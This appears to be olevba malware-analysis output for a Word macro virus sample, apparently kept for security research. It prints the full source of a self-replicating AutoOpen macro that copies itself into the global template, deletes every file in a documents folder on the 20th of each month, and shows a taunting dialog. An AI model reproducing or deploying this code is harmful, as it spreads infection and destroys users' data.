olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.bu-c360fa1a48e6dc4b4b346bc44c032445512ed29c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.bu-c360fa1a48e6dc4b4b346bc44c032445512ed29c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoopeN.bas 
in file: Virus.MSWord.Minimal.bu-c360fa1a48e6dc4b4b346bc44c032445512ed29c - OLE stream: 'Macros/VBA/AutoopeN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim a$
Dim b$
Dim diálogoEjem As Object
Dim botón
     'VIRUS LUPITA
     'MADE IN PERU
     On Error Resume Next
     a$ = WordBasic.[FileName$]() + ":AutoopeN"
     b$ = "Global:AUTOOPEN"
     WordBasic.MacroCopy a$, b$
     WordBasic.FileSaveAs Format:=1
     WordBasic.MacroCopy b$, a$
     If WordBasic.Day(WordBasic.Now()) = 20 Then
        WordBasic.Kill "C:\MIS DOCUMENTIS\*.*"
'*******LA CAJITA DE MENSAJE ****************
     WordBasic.BeginDialog 320, 144, "Microsoft Word"
    WordBasic.PushButton 110, 93, 97, 21, "OK", "Presionar1"
    WordBasic.Text 75, 32, 237, 33, "Los archivos de tu maquina ", "Texto1"
    WordBasic.Text 75, 49, 237, 33, "han sido borrados.....jejejeje", "Texto2"
    WordBasic.EndDialog
'********************************************
    Set diálogoEjem = WordBasic.CurValues.UserDialog
    WordBasic.DisableInput 1
    botón = WordBasic.Dialog.UserDialog(diálogoEjem)
    WordBasic.DisableInput 0
     End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoopeN            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
